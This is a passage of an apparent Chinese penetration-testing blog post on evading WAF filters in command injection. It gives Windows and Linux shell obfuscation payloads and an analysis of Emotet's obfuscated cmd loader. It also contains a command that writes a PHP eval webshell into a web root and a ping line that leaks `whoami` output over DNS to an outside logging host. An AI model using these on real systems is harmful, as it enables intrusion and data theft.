@@ -1,0 +1,309 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>绕过WAF运行命令执行漏洞的方法 | t1chm1's 自留地</title><meta name="keywords" content="绕waf"><meta name="author" content="t1chm1"><meta name="copyright" content="t1chm1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="绕过WAF运行命令执行漏洞的方法 0x01 Windows（不区分大小写） 1.1 符号和命令的关系 如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过： &quot;和^是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。 这里有几个需要注意的地方： 12345在命令中可以有无数个&quot;，但是不能有两个连续的^在命令中如果&quot;在^之前，则&quot;的个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过WAF运行命令执行漏洞的方法">
+<meta property="og:url" content="http://whmsec.github.io/2022/10/28/bypass/index.html">
+<meta property="og:site_name" content="t1chm1&#39;s 自留地">
+<meta property="og:description" content="绕过WAF运行命令执行漏洞的方法 0x01 Windows（不区分大小写） 1.1 符号和命令的关系 如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过： &quot;和^是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。 这里有几个需要注意的地方： 12345在命令中可以有无数个&quot;，但是不能有两个连续的^在命令中如果&quot;在^之前，则&quot;的个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://whmsec.github.io/img/111.jpg">
+<meta property="article:published_time" content="2022-10-28T09:15:41.000Z">
+<meta property="article:modified_time" content="2022-10-28T09:55:04.693Z">
+<meta property="article:author" content="t1chm1">
+<meta property="article:tag" content="绕waf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://whmsec.github.io/img/111.jpg"><link rel="shortcut icon" href="/img/avator.png"><link rel="canonical" href="http://whmsec.github.io/2022/10/28/bypass/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: [object Object]
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '绕过WAF运行命令执行漏洞的方法',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-28 17:55:04'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avator.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/111.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">t1chm1's 自留地</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">绕过WAF运行命令执行漏洞的方法</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-28T09:15:41.000Z" title="发表于 2022-10-28 17:15:41">2022-10-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-28T09:55:04.693Z" title="更新于 2022-10-28 17:55:04">2022-10-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="绕过WAF运行命令执行漏洞的方法"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="绕过WAF运行命令执行漏洞的方法">绕过WAF运行命令执行漏洞的方法</h2>
+<h3 id="0x01-Windows（不区分大小写）"><strong>0x01 Windows（不区分大小写）</strong></h3>
+<h4 id="1-1-符号和命令的关系">1.1 符号和命令的关系</h4>
+<p>如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过：</p>
+<p><code>&quot;</code>和<code>^</code>是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。</p>
+<p>这里有几个需要注意的地方：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在命令中可以有无数个&quot;，但是不能有两个连续的^</span><br><span class="line">在命令中如果&quot;在^之前，则&quot;的个数必须为偶数个</span><br><span class="line">在命令中如果&quot;在^之后，并且带有参数，则命令中的&quot;个数必须为偶数</span><br><span class="line">在命令的参数中，单个字符前后&quot;的个数只能有一个或者两个</span><br><span class="line">如果成对的括号中间有&quot;则&quot;的个数也必须为偶数</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">whoami    //正确执行</span><br><span class="line">WhOAmi    //正确执行</span><br><span class="line">Who&quot;amI    //正确执行</span><br><span class="line">((Who&quot;amI))    //错误</span><br><span class="line">((Who&quot;&quot;amI))    //正确执行</span><br><span class="line">Who&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;amI    //正确执行</span><br><span class="line">who&quot;&quot;&quot;a^mi    //错误</span><br><span class="line">who&quot;&quot;&quot;&quot;a^mi    //正确执行</span><br><span class="line">whoa^m&quot;&quot;&quot;&quot;i    //正确执行</span><br><span class="line">whoa^m&quot;&quot;&quot;i    //正确执行</span><br><span class="line">whoa^^mi    //错误</span><br><span class="line">n^e^t user    //正确执行</span><br><span class="line">n^e^t&quot;&quot; user    //正确执行</span><br><span class="line">n^e^t&quot;&quot;&quot; user    //错误</span><br><span class="line">n^e^t&quot;&quot; u&quot;ser    //正确执行</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;ser    //正确执行</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;&quot;ser    //错误</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;s&quot;er    //正确执行</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;s&quot;&quot;er    //正确执行</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;s&quot;&quot;&quot;er    //错误</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171627591.png" alt="图片"></p>
+<p><img src="/2022/10/28/bypass/640-20221028171628011.png" alt="图片"></p>
+<p><img src="/2022/10/28/bypass/640-20221028171628216.png" alt="图片"></p>
+<p><img src="/2022/10/28/bypass/640-20221028171628159.png" alt="图片"></p>
+<h4 id="1-2-了解set命令和Windows变量">1.2 了解set命令和Windows变量</h4>
+<p>在cmd中set用来进行变量赋值，而%%括起来的变量会引用其赋的值。</p>
+<p><img src="/2022/10/28/bypass/640-20221028171627754.png" alt="图片"></p>
+<p>这样就可以进行命令执行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd=whoami    //赋值变量为whoami%cmd%              //执行命令</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628144.png" alt="图片"></p>
+<p>也可以赋值多个变量，拼接利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd1=whoset cmd2=amset cmd3=i%cmd1%%cmd2%%cmd3%</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171627857.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd1=whoset cmd3=i%cmd1%am%cmd3%</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171627973.png" alt="图片"></p>
+<p>也可以与1.2的内容进行合并</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd1=wh&quot;&quot;oset cmd3=i&quot;&quot;&quot;%cmd1%a^m%cmd3%</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628088.png" alt="图片"></p>
+<p>也可以在赋值的时候加入空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd1=s&quot;&quot;erset cmd2=t uset cmd3=n^e%cmd3%%cmd2%%cmd1%</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628125.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cmd /C &quot;set cmd1=s&quot;&quot;er &amp;&amp; set cmd2=t u &amp;&amp; set cmd3=n^e &amp;&amp; call %cmd3%%cmd2%%cmd1%&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628201.png" alt="图片"></p>
+<p>当使用<code>cmd /V:ON</code>或<code>cmd /V:O</code>时可以不使用call命令来扩展变量，使用 %var% 或 !var! 来扩展变量，!var!可以用来代替%var%</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /V:ON /C &quot;set cmd=net user &amp;&amp; !cmd!&quot;cmd /V:O /C &quot;set cmd=net user &amp;&amp; !cmd!&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628251.png" alt="图片"></p>
+<p><img src="/2022/10/28/bypass/640-20221028171628284.png" alt="图片"></p>
+<h4 id="1-3-Windows切割字符串">1.3 Windows切割字符串</h4>
+<p>拿whoami举例，实践Windows切割字符串的语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set cmd=whoami</span><br><span class="line">%cmd:~0% //取出a的值中的所有字符此时正常执行whoami</span><br><span class="line">%cmd:~0,1% //取出a的值，从第0个位置开始，取1个值此时因为w总共就1个字符</span><br><span class="line">%cmd:~0,6% //取出a的值，从第0个位置开始，取6个值此时因为whoami总共就6个字符</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628290.png" alt="图片"></p>
+<p>由此可以看出来截取字符串的语法为<code>%变量名:~x,y%</code>即从变量第x位开始，截取y个字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\a&gt;set str=0123456789</span><br><span class="line">C:\Users\a&gt;echo %str:~-1%</span><br><span class="line">9</span><br><span class="line">从最后1位开始取整个字符串</span><br><span class="line">C:\Users\a&gt;echo %str:~-6%</span><br><span class="line">456789</span><br><span class="line">从倒数第6位开始取整个字符串</span><br><span class="line">C:\Users\a&gt;echo %str:~-9%</span><br><span class="line">123456789</span><br><span class="line">从倒数第9位开始取整个字符串</span><br><span class="line">C:\Users\a&gt;echo %str:~-9,2%</span><br><span class="line">12</span><br><span class="line">从倒数第9位开始取2位</span><br><span class="line">C:\Users\a&gt;echo %str:~-9,4%</span><br><span class="line">1234</span><br><span class="line">从倒数第9位开始取4位</span><br><span class="line">C:\Users\a&gt;echo %str:~-9,-2%</span><br><span class="line">1234567</span><br><span class="line">从倒数第9位开始少取最后2位</span><br><span class="line">C:\Users\a&gt;echo %str:~-9,-4%</span><br><span class="line">12345</span><br><span class="line">从倒数第9位开始少取最后4位</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628287.png" alt="图片"></p>
+<p>既然已经熟悉了如何切割字符，那么我们来看一下都有什么环境变量可以用</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628396.png" alt="图片"></p>
+<p>我们可以拼命令了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\a&gt;echo %COMPUTERNAME:~0,1%h%windir:~-3,1%%HOMEPATH:~-1%mi</span><br><span class="line">Whoami</span><br><span class="line">C:\Users\a&gt;%COMPUTERNAME:~0,1%h%windir:~-3,1%%HOMEPATH:~-1%mi</span><br><span class="line">win-tbucg5qo47j\a</span><br><span class="line">C:\Users\a&gt;d^i^r%CommonProgramFiles:~10,1%%commonprogramfiles:~0,3% </span><br><span class="line">驱动器 C 中的卷没有标签。 卷的序列号是 5CE5-9A63</span><br><span class="line"> C:\ 的目录</span><br><span class="line">2022/03/12  00:20    &lt;DIR&gt;          JspStudy</span><br><span class="line">2022/07/09  20:04    &lt;DIR&gt;          MailMasterData</span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628332.png" alt="图片"></p>
+<p><img src="/2022/10/28/bypass/640-20221028171628391.png" alt="图片"></p>
+<p>我们还可以凑php一句话（这里为了方便所以自定义了一些字符）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\a&gt;set web=^&lt;^&gt;/@$_PHPOST[]?&#x27;e()val</span><br><span class="line">C:\Users\a&gt;echo ^%web:~0,1%^%web:~-8,1%%web:~6,3% ^%web:~-6,1%^%web:~-3,3%^%web:~-5,1%%web:~4,2%%web:~8,5%^%web:~-7,1%%web:~-1,1%^%web:~-7,1%%web:~13,1%^%web:~-4,1% ^%web:~-8,1%^%web:~1,1% &gt; C:\phpstudy_pro\WWW\b.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628432.png" alt="图片"></p>
+<p><img src="/2022/10/28/bypass/640-20221028171628443.png" alt="图片"></p>
+<p>因为拼接字符需要得到大量的位置，为了方便拼接可以使用for命令来讲所有位置设成一个列表，以此循环遍历列表，合并字符串，还能起到混淆的作用。</p>
+<p>这里注意set不能以空格结尾否则，变量会将空格进行赋值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /V:ON /C &quot; set kpx=vwchdoaadmei&amp;&amp; for %G in (1,3,5,7,9,11,26) do set lq=!lq!!kpx:~%G,1!&amp;&amp; if %G==26  !lq:~4!&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628427.png" alt="图片"></p>
+<p><strong>错误示范</strong></p>
+<p>下面的方法拼接出来的其实是w h o a m i 因为有空格后面的都视作参数没有显示</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628475.png" alt="图片"></p>
+<p>分析Emotet木马中的cmd命令</p>
+<p>Emotet一款著名的银行木马，首次出现于2014年年中。该木马主要通过垃圾邮件的方式传播感染目标用户，其不断变化传播花样，采用越来越复杂的混淆编码来躲避检测。</p>
+<p>现在我们以Emotet木马为例，我们来试着分析一下经过混淆后的cmd内容</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628711.png" alt="图片"></p>
+<p>先将混淆cmd命令中的转义字符“^”全部去掉，再将除了变量@之外的逗号“,”、分号“;”、多余空格删除。注意保留变量@中的逗号和分号，否则影响输出结果。</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628730.png" alt="图片"></p>
+<p>下图为无意义的四个字符串，cmd会自动忽略。</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628657.png" alt="图片"></p>
+<p>可以看出这里利用了cmd的系统环境变量<code>%comspec%</code>，即是cmd.exe的执行路径，因此会执行cmd命令，这里才是命令的真正开头。因此程序开头可以进行化简。</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628651.png" alt="图片"></p>
+<p>去除无意义的字符串后可以化简为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%comspec% /c for /f &quot; delims=vf= tokens=2&quot; %f in ( &#x27;assoc .cmd&#x27; ) do %f /V /R</span><br></pre></td></tr></table></figure>
+<p>先利用<code>%comspec% /c</code>执行第一个for循环，再利用<code>for</code>循环的<code>/f</code>参数，在命令<code>assoc .cmd</code>结果<code>.cmd=cmdfile</code>中以字符v、f、=为分隔符，取第二列即是“<code>cmd</code>”。</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628589.png" alt="图片"></p>
+<p>因此这里用for循环生成的cmd又开启了新一个cmd程序来运行下面的字符串内的程序。</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628912.png" alt="图片"></p>
+<p>这里自定义了一个环境变量<code>@</code>，等于一个1460长度的字符串。然后利用for循环的/L参数，遍历变量<code>@</code>：<code>for /L %s in (1459,-4,+3 ) do set \=!\!!@ :~ %s, 1!&amp; if %s equ 3 call %\:~-365%</code>，这个for循环自定义了环境变量&quot;<code>\</code>&quot;，还启用了延迟的环境变量扩展<code>!</code>，<code>!@:~%s,1!</code>表示循环变量<code>%s</code>从1459开始，步长为<code>-4</code>，到<code>3</code>结束，循环提取变量<code>@</code>中的字符，添加到<code>\</code>变量中。当<code>%s</code>到<code>3</code>的时候就会执行<code>\</code>中倒数365个字符组成的程序。</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628770.png" alt="图片"></p>
+<h4 id="1-4-逻辑运算符在绕过中的作用">1.4 逻辑运算符在绕过中的作用</h4>
+<p><code>|</code> 在cmd中，可以连接命令，且只会执行后面的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami | ping -n 1 www.baidu.com   //只执行ping</span><br><span class="line">ping -n 1 www.baidu.com | whoami   //只执行whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628924.png" alt="图片"></p>
+<p><code>||</code> 只有在前面命令失败才执行后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 || whoami //不执行</span><br><span class="line">whoamiping xxx. || whoami //执行whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628838.png" alt="图片"></p>
+<p><code>&amp;</code>无论前面的命令是否能执行成功都会执行后面的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 &amp; whoami //执行</span><br><span class="line">whoamiping xxx. &amp; whoami //执行whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628793.png" alt="图片"></p>
+<p><code>&amp;&amp;</code>前面命令为真才会执行后面的命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 &amp;&amp; whoami //执行whoamiping xxx. &amp;&amp; whoami //不执行whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628885.png" alt="图片"></p>
+<h3 id="0x02-Linux（区分大小写）">0x02 Linux（区分大小写）</h3>
+<h4 id="2-1-linux下的符号和逻辑运算符">2.1 linux下的符号和逻辑运算符</h4>
+<p>linux中变量使用<code>$</code>来引用，<code>;</code>表示命令结束无论命令是否执行成功都会执行下一个命令，<code>| || &amp; &amp;&amp;</code>，与Windows一样，这里就不做赘述。</p>
+<p>利用上面的符号可以进行拼接的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t=l;j=s;i=&quot; -al&quot;;$t$j$i</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628856.png" alt="图片"></p>
+<h4 id="2-2-利用未被过滤的命令">2.2 利用未被过滤的命令</h4>
+<p>假设有命令执行漏洞的网站中过滤的一些命令，但是没有过滤一些命令，例如ping命令，则可以利用ping命令来执行命令带出信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.whjtmh.dnslog.cn</span><br></pre></td></tr></table></figure>
+<p>利用DNSLog就可以获得带出的信息（对于不回显的命令执行也可以利用这种方法）</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628981.png" alt="图片"></p>
+<h4 id="2-3-linux符号之间的组合">2.3 linux符号之间的组合</h4>
+<p>类似于Windows的<code>&quot;</code>和<code>^</code>linux也有类似的使用方法，就是利用变量和参数</p>
+<p><strong>利用反斜杠绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who\ami</span><br></pre></td></tr></table></figure>
+<p><strong>利用括号括起来（当做命令执行）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(whoa&#x27;&#x27;mi)</span><br></pre></td></tr></table></figure>
+<p><strong>利用反引号或$和括号结合（将括号内命令的结果当做命令执行）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`(echo whoami)`</span><br><span class="line">$(echo whoami)</span><br></pre></td></tr></table></figure>
+<p><strong>利用Shell特殊变量绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who$*ami</span><br><span class="line">who$@ami</span><br><span class="line">who$1ami</span><br></pre></td></tr></table></figure>
+<p><strong>利用通配符匹配唯一命令名称执行命令（使用命令的绝对路径）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u?r/b?n/who?mi</span><br><span class="line">/*/*/whoam?</span><br><span class="line">/*/*i[n]/wh??mi</span><br></pre></td></tr></table></figure>
+<p><strong>综合组合</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*/*&quot;&quot;in/w&#x27;h&#x27;`dfds`??m$(sdf)i</span><br></pre></td></tr></table></figure>
+<h4 id="2-4-linux切割字符串">2.4 linux切割字符串</h4>
+<p>在linux中切割字符串的语法是${NAME:start:length}</p>
